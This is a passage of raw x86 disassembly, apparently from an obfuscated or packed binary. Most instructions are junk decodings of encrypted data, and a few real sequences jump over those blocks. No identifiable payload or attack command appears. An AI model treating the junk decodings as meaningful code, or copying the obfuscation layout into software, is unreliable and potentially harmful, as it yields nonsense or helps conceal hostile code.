  40de66:	ins    BYTE PTR es:[edi],dx
  40de67:	repz in al,0xee
  40de6a:	ins    DWORD PTR es:[edi],dx
  40de6b:	scas   eax,DWORD PTR es:[edi]
  40de6c:	push   edi
  40de6d:	xchg   edi,eax
  40de6e:	pop    ecx
  40de6f:	or     bh,dl
  40de71:	sti    
  40de72:	mov    BYTE PTR [eax],bl
  40de74:	cmp    BYTE PTR [ecx-0x5c],bh
  40de77:	adc    al,0xd4
  40de79:	outs   dx,BYTE PTR ds:[esi]
  40de7a:	xchg   BYTE PTR [esi+0x49ad4e67],cl
  40de80:	movd   DWORD PTR ds:0x64566220,mm4
  40de87:	inc    ebp
  40de88:	lock inc ecx
  40de8a:	push   esp
  40de8b:	inc    eax
  40de8c:	or     ah,BYTE PTR [edx]
  40de8e:	out    0x5c,al
  40de90:	adc    DWORD PTR [esi+0x16],edx
  40de93:	in     al,0xe3
  40de95:	inc    edi
  40de96:	mov    bh,BYTE PTR [esi]
  40de98:	lods   eax,DWORD PTR ds:[esi]
  40de99:	lahf   
  40de9a:	jns    0x40deb2
  40de9c:	outs   dx,BYTE PTR ds:[esi]
  40de9d:	std    
  40de9e:	push   ecx
  40de9f:	cmp    eax,0x8e329196
  40dea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dea5:	or     eax,0xe5dcb4ec
  40deaa:	adc    DWORD PTR ss:[edx+0x25c881a3],edx
  40deb1:	jmp    0x92f263be
  40deb6:	loop   0x40defd
  40deb8:	(bad)  
  40deb9:	xchg   ebx,eax
  40deba:	and    ecx,DWORD PTR [eax-0x24d76a3e]
  40dec0:	ret    0xf13b
  40dec3:	dec    edi
  40dec4:	xchg   esp,eax
  40dec5:	xor    ch,dh
  40dec7:	les    esi,FWORD PTR [ecx-0x3e38c7c8]
  40decd:	pop    ds
  40dece:	cmp    bh,ch
  40ded0:	mov    esp,0xfb3e2830
  40ded5:	rcr    DWORD PTR [eax],0xb8
  40ded8:	jmp    0x69f2:0x45157e0a
  40dedf:	sbb    DWORD PTR [ecx],ebx
  40dee1:	je     0x40dea5
  40dee3:	ins    DWORD PTR es:[edi],dx
  40dee4:	test   edx,edi
  40dee6:	add    ebx,DWORD PTR [ebx+0x964c13f]
  40deec:	adc    eax,0x8b1a25e4
  40def1:	xchg   esp,eax
  40def2:	xor    BYTE PTR [ecx],0x29
  40def5:	sub    DWORD PTR [ebp+0x637f4468],esi
  40defb:	and    BYTE PTR [eax+ecx*1+0x3b],dl
  40deff:	pop    ebp
  40df00:	push   ebp
  40df01:	je     0x40defd
  40df03:	pushf  
  40df04:	mov    ds:0x94360371,eax
  40df09:	stos   BYTE PTR es:[edi],al
  40df0a:	mov    dh,0x1d
  40df0c:	push   ds
  40df0d:	(bad)  
  40df0e:	pop    esi
  40df0f:	js     0x40df3a
  40df11:	or     eax,0xffd03c36
  40df16:	mov    cl,0x4e
  40df19:	sub    eax,0x67553e4d
  40df1e:	scas   al,BYTE PTR es:[edi]
  40df1f:	ins    BYTE PTR es:[edi],dx
  40df20:	int    0x4f
  40df22:	mov    ch,BYTE PTR [ebp+0x20]
  40df25:	fld    QWORD PTR [esi-0x4a]
  40df28:	push   0xffffffe3
  40df2a:	adc    al,0xf4
  40df2c:	mov    ebx,0x5bd8d58b
  40df31:	(bad)  
  40df32:	(bad)  
  40df33:	clc    
  40df34:	fnstenv [ecx+0x7b]
  40df37:	iret   
  40df38:	jg     0x40dfad
  40df3a:	dec    ebx
  40df3b:	pop    eax
  40df3c:	or     DWORD PTR [ecx+0x1],edi
  40df3f:	inc    esi
  40df40:	not    eax
  40df42:	mov    bl,0xd
  40df44:	lahf   
  40df45:	and    BYTE PTR [eax],al
  40df47:	loop   0x40dee8
  40df49:	mov    ebx,0x886b1897
  40df4e:	pop    eax
  40df4f:	fmul   QWORD PTR [ecx+0x29]
  40df52:	mov    bh,bh
  40df54:	(bad)  
  40df55:	push   cs
  40df56:	mov    edi,0xa5f60b3f
  40df5b:	cmp    eax,0xd1daaa13
  40df60:	lods   eax,DWORD PTR ds:[esi]
  40df61:	ret    0x6b3e
  40df64:	push   DWORD PTR [esi+0x987ee04]
  40df6a:	cmp    eax,0x3160991e
  40df6f:	inc    ebp
  40df70:	ret    
  40df71:	mov    WORD PTR [edx+0x3ee4ca95],cs
  40df77:	push   ds
  40df78:	cmp    al,BYTE PTR [esi-0xf]
  40df7b:	sub    ebp,eax
  40df7d:	adc    DWORD PTR [esi],0x9029af8d
  40df83:	mov    BYTE PTR [ecx-0x3d6516dd],al
  40df89:	xchg   edi,eax
  40df8a:	and    DWORD PTR es:[eax+0x51251da3],ecx
  40df91:	xchg   edx,eax
  40df92:	sbb    DWORD PTR [ebp-0x11],edi
  40df95:	neg    cl
  40df97:	out    dx,al
  40df98:	and    al,0x9d
  40df9a:	mov    ch,BYTE PTR ds:0xae8c7666
  40dfa0:	or     BYTE PTR [esi+0xa],bl
  40dfa3:	aaa    
  40dfa4:	xchg   ecx,eax
  40dfa5:	xchg   esi,eax
  40dfa6:	fcom   st(0)
  40dfa8:	xchg   BYTE PTR [edx],bl
  40dfaa:	add    eax,ebx
  40dfac:	mov    DWORD PTR [ebp-0x54],eax
  40dfaf:	not    DWORD PTR ds:0x42a859
  40dfb5:	lea    eax,[ebp-0x1c]
  40dfb8:	mov    DWORD PTR [ebp-0x50],eax
  40dfbb:	mov    eax,DWORD PTR [ebp-0x60]
  40dfbe:	xor    eax,esi
  40dfc0:	add    eax,ebx
  40dfc2:	mov    DWORD PTR [ebp-0x60],eax
  40dfc5:	lea    eax,[ebp-0x60]
  40dfc8:	push   eax
  40dfc9:	mov    eax,DWORD PTR [ebp+0xc]
  40dfcc:	jmp    0x40e224
  40dfd1:	ds cmp eax,0xd1d1d2d2
  40dfd7:	rol    DWORD PTR ds:[ecx+0x7e40413a],1
  40dfde:	icebp  
  40dfdf:	not    DWORD PTR [eax+ecx*4]
  40dfe2:	mov    dl,0x78
  40dfe4:	js     0x40e01b
  40dfe6:	jle    0x40e060
  40dfe8:	js     0x40dfbf
  40dfea:	loope  0x40e026
  40dfec:	(bad)  
  40dfed:	xor    al,BYTE PTR [ebx+0x31]
  40dff0:	inc    esi
  40dff1:	push   esi
  40dff2:	push   esp
  40dff3:	push   edx
  40dff4:	cmp    al,0xd8
  40dff6:	xchg   ebx,eax
  40dff7:	lahf   
  40dff8:	pop    esi
  40dff9:	ss sahf 
  40dffb:	jle    0x40e051
  40dffd:	repz push 0x42
  40e000:	mov    edx,0x87206498
  40e005:	add    BYTE PTR [ecx],dl
  40e007:	int    0x27
  40e009:	or     BYTE PTR [ebx],ch
  40e00b:	aam    0x47
  40e00d:	repnz fsub st,st(6)
  40e010:	(bad)  
  40e011:	adc    bl,ah
  40e013:	lea    eax,[esi]
  40e015:	ins    BYTE PTR es:[edi],dx
  40e016:	int    0x4b
  40e018:	and    DWORD PTR [ecx-0x1],eax
  40e01b:	stc    
  40e01c:	inc    eax
  40e01d:	scas   al,BYTE PTR es:[edi]
  40e01e:	sub    al,0x16
  40e020:	jecxz  0x40e0a0
  40e022:	leave  
  40e023:	xor    ch,0xc9
  40e026:	sub    al,0x5
  40e028:	mov    ds:0xa8df5523,al
  40e02d:	enter  0x9f9d,0x72
  40e031:	je     0x40e0a1
  40e033:	add    bh,bl
  40e035:	mov    ds:0xcc528c98,eax
  40e03a:	pop    ss
  40e03b:	out    dx,al
  40e03c:	out    0x1d,al
  40e03e:	aas    
  40e03f:	repnz mov al,ds:0x5c299c52
  40e045:	push   ebp
  40e046:	ins    DWORD PTR es:[edi],dx
  40e047:	cmp    bl,BYTE PTR [ecx]
  40e049:	xchg   ebx,eax
  40e04a:	bnd jns 0x40e005
  40e04d:	ds xchg edx,eax
  40e04f:	ret    
  40e050:	loopne 0x40e077
  40e052:	fnstenv ss:[ebp+0x3d5cae64]
  40e059:	div    BYTE PTR [edi]
  40e05b:	push   cs
  40e05c:	cmp    al,0x75
  40e05e:	mov    esp,0xffcb9ee4
  40e063:	fdivr  DWORD PTR [ecx+0x2f]
  40e066:	pop    ebx
  40e067:	sbb    esp,ecx
  40e069:	ins    BYTE PTR es:[edi],dx
  40e06a:	or     DWORD PTR [edi+0x4582eaa5],edx
  40e070:	enter  0x8ecf,0xdd
  40e074:	mov    al,ds:0xdf67529c
  40e079:	adc    BYTE PTR [ebx-0x794fbaae],bl
  40e07f:	dec    esi
  40e080:	mov    cl,0x62
  40e082:	loop   0x40e01a
  40e084:	mov    dh,0xf0
  40e086:	or     BYTE PTR [edx],al
  40e088:	xor    DWORD PTR [esi+0x141999ef],esi
  40e08e:	add    BYTE PTR [ecx],cl
  40e090:	cmp    eax,0x7cd5c181
  40e095:	shl    dh,0x9e
  40e098:	call   0x7329:0x379bf4e7
  40e09f:	pop    edx
  40e0a0:	dec    edx
  40e0a1:	jge    0x40e0f7
  40e0a3:	clc    
  40e0a4:	repz cli 
  40e0a6:	jmp    DWORD PTR [edx+0x21eb85e5]
  40e0ac:	pop    es
  40e0ad:	push   cs
  40e0ae:	add    eax,0xc92789fb
  40e0b3:	out    dx,al
  40e0b4:	add    dh,ah
  40e0b6:	adc    BYTE PTR [ebx+0x49],dl
  40e0b9:	inc    ebx
  40e0ba:	sub    eax,0x15ff081a
  40e0bf:	mov    esi,0xf1d9b8a1
  40e0c4:	popa   
  40e0c5:	dec    ebp
  40e0c6:	adc    DWORD PTR [esi],0xd883b1ae
  40e0cc:	fistp  DWORD PTR [eax-0x38]
  40e0cf:	xchg   ebp,eax
  40e0d0:	and    eax,0x3ca6669d
  40e0d5:	mov    dh,0x14
  40e0d7:	ret    
  40e0d8:	loopne 0x40e10e
  40e0da:	mov    BYTE PTR [edx-0x44],cl
  40e0dd:	mov    esi,DWORD PTR [ebx-0x7967261c]
  40e0e3:	inc    ebx
  40e0e4:	xchg   edx,eax
  40e0e5:	xchg   ah,bh
  40e0e7:	daa    
  40e0e8:	mov    ebp,0x7bb90c9e
  40e0ed:	(bad)  
  40e0ee:	clc    
  40e0ef:	mov    ds:0x6136643c,al
  40e0f4:	jge    0x40e0ca
  40e0f6:	js     0x40e080
  40e0f8:	xlat   BYTE PTR ds:[ebx]
  40e0f9:	and    eax,0x9887777e
  40e0fe:	add    BYTE PTR [eax],dl
  40e100:	nop
  40e101:	jp     0x40e0e6
  40e103:	mov    ebx,0x690edaed
  40e108:	dec    ebp
  40e109:	push   ds
  40e10a:	loope  0x40e182
  40e10c:	sub    eax,0xa2cc6ce3
  40e111:	push   es
  40e112:	cld    
  40e113:	xchg   edx,eax
  40e114:	das    
  40e115:	mov    DWORD PTR [ecx+0x449baded],ebp
  40e11b:	pop    ebp
  40e11c:	jmp    0xaa42:0x8caa20e3
  40e123:	mov    al,0xa2
  40e125:	pop    ebp
  40e126:	or     al,0x60
  40e128:	icebp  
  40e129:	fld    TBYTE PTR [ebx+esi*2]
  40e12c:	push   esp
  40e12d:	xchg   esi,eax
  40e12e:	inc    edx
  40e12f:	adc    al,0x64
  40e131:	test   DWORD PTR [edx],0xa392f166
  40e137:	out    dx,al
  40e138:	fldenv [edi+ebp*4+0x5d]
  40e13c:	pop    ecx
  40e13d:	xchg   edi,eax
  40e13e:	add    eax,0xed25d4d9
  40e143:	mov    eax,ds:0x1cd9faf6
  40e148:	adc    BYTE PTR [edi-0x3],ch
  40e14b:	jo     0x40e12a
  40e14d:	or     dh,BYTE PTR [esi]
  40e14f:	out    0x80,eax
  40e151:	mov    esi,0xf358caa5
  40e156:	xlat   BYTE PTR ds:[ebx]
  40e157:	fisttp DWORD PTR [edx-0x18]
  40e15a:	test   BYTE PTR [edx],al
  40e15c:	xchg   ecx,eax
  40e15d:	sbb    DWORD PTR [ecx+0x75],esi
  40e160:	xchg   edx,eax
  40e161:	pop    edx
  40e162:	fs (bad) 
  40e164:	sbb    ecx,DWORD PTR [ebx-0x42fe799a]
  40e16a:	jae    0x40e10c
  40e16c:	cdq    
  40e16d:	jg     0x40e180
  40e16f:	es push ebp
  40e171:	fisubr WORD PTR [edi-0x29d747fd]
  40e177:	inc    edi
  40e178:	mov    BYTE PTR [esi+ebp*1-0x5f8fde9e],al
  40e17f:	mov    ecx,0xd06b6542
  40e184:	test   al,0x7b
  40e186:	fnstsw ax
  40e188:	cmp    esi,DWORD PTR ds:0x16970ce3
  40e18e:	xchg   esi,eax
  40e18f:	das    
  40e190:	(bad)  
  40e191:	imul   DWORD PTR [edx]
  40e193:	sahf   
  40e194:	cli    
  40e195:	sar    DWORD PTR [edi],cl
  40e197:	dec    ebx
  40e198:	mov    edx,0xf668a76e
  40e19d:	gs push ds
  40e19f:	gs iret 
  40e1a1:	xor    al,0x75
  40e1a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1a4:	cmp    esi,esp
  40e1a6:	sbb    al,0xb9
  40e1a8:	xchg   ecx,eax
  40e1a9:	jp     0x40e1e1
  40e1ab:	loop   0x40e1a4
  40e1ad:	repz fs adc ebx,esi
  40e1b1:	jnp    0x40e221
  40e1b3:	push   edi
  40e1b4:	sbb    al,0xa2
  40e1b6:	and    ch,BYTE PTR [edx]
  40e1b8:	ror    BYTE PTR [edx+0x3c],0xb4
  40e1bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1bd:	xchg   dl,dh
  40e1bf:	int3   
  40e1c0:	add    BYTE PTR [ebx-0x6b],al
  40e1c3:	pop    ebx
  40e1c4:	inc    ecx
  40e1c5:	in     eax,0x9b
  40e1c7:	mov    bh,0xbc
  40e1c9:	lods   eax,DWORD PTR ds:[esi]
  40e1ca:	jae    0x40e166
  40e1cc:	mov    dl,0xfe
  40e1ce:	imul   ebx,DWORD PTR [edi+0x44],0x45
  40e1d2:	gs xor eax,0x60d48def
  40e1d8:	test   BYTE PTR [ebx-0x70f426e1],ah
  40e1de:	sbb    DWORD PTR [edi+0xc],ebx
  40e1e1:	fisubr DWORD PTR [esi]
  40e1e3:	out    dx,al
  40e1e4:	(bad)  
  40e1e5:	adc    al,BYTE PTR [esi]
  40e1e7:	loope  0x40e220
  40e1e9:	adc    ecx,DWORD PTR [ebx+ebx*1+0x269e20e2]
  40e1f0:	outs   dx,BYTE PTR ds:[esi]
  40e1f1:	sbb    DWORD PTR [esi+esi*4+0x2e],edx
  40e1f5:	mov    edx,edx
  40e1f7:	cmp    bh,BYTE PTR [eax]
  40e1f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1fa:	lea    ecx,[eax-0x59e6f692]
  40e200:	cmp    BYTE PTR [edi-0x7dc02ef0],0xd6
  40e207:	call   0x4074fa29
  40e20c:	and    bl,dl
  40e20e:	loop   0x40e246
  40e210:	jecxz  0x40e27b
  40e212:	pop    esi
  40e213:	repz out dx,eax
  40e215:	imul   ecx,edi,0x6
  40e218:	aam    0x74
  40e21a:	mov    al,dl
  40e21c:	lock mov ah,0xd
  40e21f:	mov    ds:0x4556c54d,eax
  40e224:	xor    eax,esi
  40e226:	add    eax,ebx
  40e228:	push   eax
  40e229:	jmp    0x40e481
  40e22e:	(bad)  
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	(bad)  
  40e231:	retf   0xc9d5
  40e234:	fcmovu st,st(3)
  40e236:	aas    
  40e237:	cmp    al,0x7f
  40e239:	push   es
  40e23a:	push   edx
  40e23b:	or     bl,BYTE PTR [edx-0x39]
  40e23e:	inc    ebp
  40e23f:	mov    al,0x78
  40e241:	js     0x40e278
  40e243:	jle    0x40e2bd
  40e245:	js     0x40e26f
  40e247:	inc    edx
  40e248:	gs ins DWORD PTR es:[edi],dx
  40e24a:	in     eax,0x65
  40e24c:	add    al,0x4f
  40e24e:	jbe    0x40e287
  40e250:	xor    DWORD PTR [edx-0x40],ebx
  40e253:	inc    esi
  40e254:	adc    eax,0x71df5652
  40e259:	gs sub dh,ch
  40e25c:	retf   
  40e25d:	xor    esi,DWORD PTR [ecx+eax*8+0x4c3ea1d8]
  40e264:	inc    ecx
  40e265:	int    0xea
  40e267:	mov    al,ds:0x773129ae
  40e26c:	add    BYTE PTR [edi],cl
  40e26e:	cmp    bh,BYTE PTR [edx+0x47dc4367]
  40e274:	repnz mov BYTE PTR [eax-0x52],al
  40e278:	push   edi
  40e279:	sub    BYTE PTR [eiz*4-0x40e56ab8],cl
  40e280:	push   ebx
  40e281:	or     al,0xa
  40e283:	jmp    0xbf9e338e
  40e288:	mov    WORD PTR [edx],ss
  40e28a:	adc    al,0xef
  40e28c:	pop    edi
  40e28d:	ss push esp
  40e28f:	in     eax,dx
  40e290:	mov    BYTE PTR [ebp-0x1c],ch
  40e293:	mov    bl,0xa9
  40e295:	and    cl,BYTE PTR [edx+edx*1]
  40e298:	and    eax,0x672caa32
  40e29d:	repz je 0x40e293
  40e2a0:	and    al,0xd3
  40e2a2:	ds popf 
  40e2a4:	mov    dl,0x34
  40e2a6:	mov    ecx,0xbc814346
  40e2ab:	ins    BYTE PTR es:[edi],dx
  40e2ac:	xor    BYTE PTR [edi+0x419e06dd],dl
  40e2b2:	jno    0x40e267
  40e2b4:	mov    ebx,0xa3eda61f
  40e2b9:	cmp    al,0xa8
  40e2bb:	and    al,cl
  40e2bd:	xchg   DWORD PTR [edi+0x82bca05],eax
  40e2c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2c4:	test   eax,0xfb1733d3
  40e2c9:	dec    ebx
  40e2ca:	inc    ebx
  40e2cb:	jle    0x40e2a1
  40e2cd:	(bad)  
  40e2ce:	xor    al,0xc3
  40e2d0:	dec    esi
  40e2d1:	aas    
  40e2d2:	pop    esp
  40e2d3:	xor    edi,DWORD PTR [ecx+esi*2-0x25]
  40e2d7:	mov    edi,0xdaa0cd44
  40e2dc:	popa   
  40e2dd:	imul   eax,DWORD PTR cs:[eax],0x44
  40e2e1:	mov    cl,0x30
  40e2e3:	mov    dl,0xf8
  40e2e5:	loopne 0x40e26f
  40e2e7:	daa    
  40e2e8:	adc    eax,0x7134a8fb
  40e2ed:	out    0xb4,eax
  40e2ef:	jnp    0x40e275
  40e2f1:	ins    BYTE PTR es:[edi],dx
  40e2f2:	push   esi
  40e2f3:	cmp    ebx,DWORD PTR [ebp+0x54df38d4]
  40e2f9:	sti    
  40e2fa:	sub    eax,DWORD PTR [edx+0x705ec9db]
  40e300:	popf   
  40e301:	into   
  40e302:	cdq    
  40e303:	daa    
  40e304:	lahf   
  40e305:	test   al,0x27
  40e307:	outs   dx,BYTE PTR ds:[esi]
  40e308:	outs   dx,BYTE PTR ds:[esi]
  40e309:	fs stc 
  40e30b:	mov    ebx,DWORD PTR [edx]
  40e30d:	jmp    0xd0e:0x19e6cfd3
  40e314:	test   eax,0x185e3250
  40e319:	push   0xb4ce0103
  40e31e:	ds aam 0x58
  40e321:	fidiv  WORD PTR [edi+0x673b53ec]
  40e327:	ja     0x40e2f8
  40e329:	and    BYTE PTR [edi+0x19481b29],al
  40e32f:	fld    DWORD PTR [eax+0x32391fa9]
  40e335:	mov    dl,0xb4
  40e337:	mov    esi,0x92b0feec
  40e33c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e33d:	mov    ecx,edi
  40e33f:	mov    bh,dl
  40e341:	stos   BYTE PTR es:[edi],al
  40e342:	popa   
  40e343:	nop
  40e344:	sbb    ebp,DWORD PTR [eax]
  40e346:	xchg   ecx,eax
  40e347:	push   edx
  40e348:	(bad)  
  40e34a:	cmp    esp,DWORD PTR [ecx-0x7f8491fd]
  40e350:	push   ecx
  40e351:	mov    edi,0xb8cf041
  40e356:	inc    ecx
  40e357:	inc    ecx
  40e358:	xor    eax,0xae9abbca
  40e35d:	pop    ss
  40e35e:	inc    esp
  40e35f:	addr16 jge 0x40e321
  40e362:	mov    dh,0x95
  40e364:	ds into 
  40e366:	rcr    BYTE PTR [ecx-0x6b],1
  40e369:	jmp    0xa85b:0xa680aff1
  40e370:	js     0x40e34f
  40e372:	add    eax,0x9c588356
  40e377:	test   eax,0xa8735fe0
  40e37c:	rcl    dl,0xdc
  40e37f:	mov    dh,0x35
  40e381:	push   0x66a8d4cf
  40e386:	sbb    eax,0xf36b0924
  40e38b:	pop    ss
  40e38c:	call   0x8245:0x3ebe3a3c
  40e393:	out    0x4e,al
  40e395:	imul   esp,DWORD PTR [esi+0x2e67f3ed],0xffffff97
  40e39c:	shr    ecx,cl
  40e39e:	dec    edi
  40e39f:	das    
  40e3a0:	jae    0x40e37a
  40e3a2:	push   0xffffff95
  40e3a4:	add    cl,bh
  40e3a6:	adc    BYTE PTR [eax-0x63],cl
  40e3a9:	daa    
  40e3aa:	or     al,0xc
  40e3ac:	xor    edx,esi
  40e3ae:	out    0x14,al
  40e3b0:	inc    ebx
  40e3b1:	pop    edi
  40e3b2:	enter  0x86c0,0xb0
  40e3b6:	mov    dh,0x61
  40e3b8:	jns    0x40e3ba
  40e3ba:	shl    DWORD PTR [ebx+0x0],cl
  40e3bd:	int    0x11
  40e3bf:	jnp    0x40e39c
  40e3c1:	mov    ds:0xa3cd732f,eax
  40e3c6:	ds out 0xfc,eax
  40e3c9:	or     ah,ah
  40e3cb:	push   es
  40e3cc:	fmul   DWORD PTR [ecx-0x40]
  40e3cf:	loope  0x40e3aa
  40e3d1:	pop    ebp
  40e3d2:	mov    DWORD PTR [ebp+0xd],edi
  40e3d5:	pop    ebp
  40e3d6:	adc    esp,DWORD PTR [ebx+0x7e9a0804]
  40e3dc:	cwde   
  40e3dd:	test   BYTE PTR [ebp+esi*1+0x6dee4d3e],al
  40e3e4:	mov    dl,0xe0
  40e3e6:	sub    dh,ch
  40e3e8:	or     al,0xc1
  40e3ea:	pop    ebx
  40e3eb:	inc    ecx
  40e3ec:	bound  edx,QWORD PTR [ebp+0x4995dba8]
  40e3f2:	(bad)  
  40e3f3:	shl    BYTE PTR [ebx-0x45ac4408],0xee
  40e3fa:	ficom  WORD PTR [edx-0x173d0326]
  40e400:	popw   es
  40e402:	cwde   
  40e403:	cld    
  40e404:	je     0x40e42b
  40e406:	jecxz  0x40e441
  40e408:	out    dx,al
  40e409:	adc    al,0xdc
  40e40b:	nop
  40e40c:	dec    ecx
  40e40d:	into   
  40e40e:	dec    edi
  40e40f:	sar    dh,0xf9
  40e412:	mov    edi,gs
  40e414:	ficom  WORD PTR [ebp+0x3a]
  40e417:	xchg   esi,eax
  40e418:	ja     0x40e45b
  40e41a:	ror    DWORD PTR [edx-0x32],1
  40e41d:	mov    esi,0xb89d9bdd
  40e422:	inc    ecx
  40e423:	call   0xd6d9:0x1db4e156
  40e42a:	sbb    DWORD PTR [edx-0x5b61e26e],edx
  40e430:	mov    eax,ds:0x8fd92b8
  40e435:	fidiv  DWORD PTR [ebp+0x4c]
  40e438:	sbb    al,0x75
  40e43a:	popf   
  40e43b:	xor    eax,0xb1f1bc6e
  40e440:	daa    
  40e441:	add    dl,BYTE PTR [ebp+0x5cfbfb82]
  40e447:	aas    
  40e448:	xchg   ecx,eax
  40e449:	fdivr  st(3),st
  40e44b:	pop    eax
  40e44c:	mov    edi,0x76e1dfd1
  40e451:	in     al,0x16
  40e453:	in     al,0x2a
  40e455:	push   esi
  40e456:	push   ecx
  40e457:	(bad)  
  40e458:	stc    
  40e459:	push   ebx
  40e45a:	cmp    eax,0xaac4ff60
  40e45f:	mov    ds:0xdc78e1b8,al
  40e464:	hlt    
  40e465:	or     cl,al
  40e467:	(bad)  
  40e468:	mulps  xmm0,XMMWORD PTR [edi]
  40e46b:	stc    
  40e46c:	(bad)
  40e46f:	push   edi
  40e470:	scas   eax,DWORD PTR es:[edi]
  40e471:	imul   esi,DWORD PTR [eax-0x15],0x1f7bf01a
  40e478:	lahf   
  40e479:	es xchg edi,eax
  40e47b:	mov    edi,DWORD PTR [esi+ecx*4+0x4b]
  40e47f:	pushf  
  40e480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e481:	mov    eax,ds:0x41eb06
  40e486:	push   0x41ea5c
  40e48b:	push   DWORD PTR [eax]
  40e48d:	call   0x419198
  40e492:	jmp    0x40e979
  40e497:	cmp    edi,0x13c
  40e49d:	jne    0x40e979
  40e4a3:	mov    eax,DWORD PTR [ebp-0x10]
  40e4a6:	jmp    0x40e6fe
  40e4ab:	sar    DWORD PTR ds:[esi],0xca
  40e4af:	ror    ecx,0xca
  40e4b2:	leave  
  40e4b3:	(bad)  
  40e4b4:	dec    eax
  40e4b5:	cmc    
  40e4b6:	adc    edx,DWORD PTR [ecx]
  40e4b8:	mov    WORD PTR [eax],ds
  40e4ba:	jg     0x40e4be
  40e4bc:	mov    ch,0x78
  40e4be:	js     0x40e4f5
  40e4c0:	jle    0x40e53a
  40e4c2:	js     0x40e4ec
  40e4c4:	push   ebx
  40e4c5:	push   es
  40e4c6:	xchg   BYTE PTR [ecx-0xe],al
  40e4c9:	cmp    eax,0xa10dcc6e
  40e4ce:	inc    eax
  40e4cf:	pop    ss
  40e4d0:	mov    ecx,0xc53beb88
  40e4d5:	xor    BYTE PTR [ebp-0x12],0xdc
  40e4d9:	es xchg ebp,eax
  40e4db:	add    DWORD PTR [ecx],0x9766c610
  40e4e1:	je     0x40e53d
  40e4e3:	push   ebx
  40e4e4:	cmp    ecx,DWORD PTR [ecx]
  40e4e6:	jp     0x40e518
  40e4e8:	out    dx,eax
  40e4e9:	push   cs
  40e4ea:	(bad)  
  40e4eb:	jno    0x40e548
  40e4ed:	dec    eax
  40e4ee:	rcr    DWORD PTR [ebx],0x5f
  40e4f1:	adc    eax,0xa7261575
  40e4f6:	add    ah,BYTE PTR [esi]
  40e4f8:	retf   
  40e4f9:	xor    al,0x3
  40e4fb:	jbe    0x40e520
  40e4fd:	sar    edx,0x64
  40e500:	in     eax,0xae
  40e502:	nop
  40e503:	fwait
  40e504:	rcr    DWORD PTR [ecx],1
  40e506:	out    0x35,al
  40e508:	sub    eax,0x5b7cc004
  40e50d:	repnz int3 
  40e50f:	lahf   
  40e510:	add    DWORD PTR [edi+0x5f],ebp
  40e513:	cmp    al,BYTE PTR [ebp-0x689d03a2]
  40e519:	push   edi
  40e51a:	pop    esi
  40e51b:	mov    cl,0x86
  40e51d:	ror    BYTE PTR [ebx+esi*8],cl
  40e520:	lods   eax,DWORD PTR ds:[esi]
  40e521:	stos   BYTE PTR es:[edi],al
  40e522:	xor    BYTE PTR ds:0xf35898ef,ch
  40e528:	adc    eax,0x6655c660
  40e52d:	inc    esi
  40e52e:	mov    ebp,DWORD PTR [eax+0x7646c1d8]
  40e534:	test   ebp,0x5e77e8bd
  40e53a:	in     al,0xd4
  40e53c:	mov    dh,0xfb
  40e53e:	pop    esp
  40e53f:	mov    BYTE PTR [edi],ah
  40e541:	aas    
  40e542:	es mov dl,0x74
  40e545:	dec    di
  40e547:	inc    ecx
  40e548:	fisubr DWORD PTR [esi+eax*4-0x22d64ed5]
  40e54f:	adc    al,0x7a
  40e551:	and    ch,BYTE PTR [ebx-0xe]
  40e554:	mov    dh,0xab
  40e556:	push   cs
  40e557:	inc    ebp
  40e558:	retf   
  40e559:	add    cl,bl
  40e55b:	xchg   esi,eax
  40e55c:	xchg   ebx,eax
  40e55d:	jge    0x40e5da
  40e55f:	adc    bl,bl
  40e561:	xchg   esp,eax
  40e562:	push   es
  40e563:	(bad)  
  40e564:	jl     0x40e5c8
  40e566:	gs and eax,0x5293fd43
  40e56c:	mov    esp,0x10b03b71
  40e571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e572:	xchg   DWORD PTR [ebx-0xe],esp
  40e575:	inc    ecx
  40e576:	lds    ecx,FWORD PTR [esi+eiz*8]
  40e579:	xlat   BYTE PTR ds:[ebx]
  40e57a:	fmul   QWORD PTR [eax+0x203432f2]
  40e580:	aam    0xc1
  40e582:	mov    esp,0xcb0b51f2
  40e587:	fwait
  40e588:	inc    ebp
  40e589:	mov    eax,ds:0xc8223901
  40e58e:	xchg   esi,eax
  40e58f:	imul   edx,DWORD PTR [edx-0x25fe4e3],0x79ebb742
  40e599:	add    dh,dh
  40e59b:	jae    0x40e547
  40e59d:	sub    esi,DWORD PTR [edx]
  40e59f:	pop    eax
  40e5a0:	pop    eax
  40e5a1:	into   
  40e5a2:	mov    bl,0xb4
  40e5a4:	stc    
  40e5a5:	jnp    0x40e581
  40e5a7:	xchg   ecx,eax
  40e5a8:	sub    al,0x69
  40e5aa:	aad    0x3c
  40e5ac:	iret   
  40e5ad:	dec    esp
  40e5ae:	mov    bl,0x53
  40e5b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5b1:	fs data16 aas 
  40e5b4:	mov    ds,WORD PTR [ecx-0x7f]
  40e5b7:	int3   
  40e5b8:	and    al,0xae
  40e5ba:	in     al,0xdc
  40e5bc:	add    BYTE PTR [esi+0x3a],ch
  40e5bf:	(bad)  
  40e5c0:	sub    bl,BYTE PTR [ebp+0x7d]
  40e5c3:	ja     0x40e5ea
  40e5c5:	jle    0x40e584
  40e5c7:	lds    esp,FWORD PTR [edx-0x2d]
  40e5ca:	int3   
  40e5cb:	(bad)  
  40e5cc:	sbb    edi,ebx
  40e5ce:	jno    0x40e5d6
  40e5d0:	mov    es,WORD PTR [ebx]
  40e5d2:	cli    
  40e5d3:	js     0x40e5d7
  40e5d5:	or     ebp,DWORD PTR [eax-0x52]
  40e5d8:	inc    eax
  40e5d9:	(bad)  
  40e5da:	mov    al,ds:0x576d860e
  40e5df:	adc    al,0x79
  40e5e1:	xor    al,0x3b
  40e5e3:	int3   
  40e5e4:	loope  0x40e5da
  40e5e6:	(bad)  
  40e5e8:	stc    
  40e5e9:	mov    WORD PTR [ebp+0x36],gs
  40e5ec:	ret    0xf33a
  40e5ef:	call   0xf3c1:0xffe6859c
  40e5f6:	sub    al,0x4a
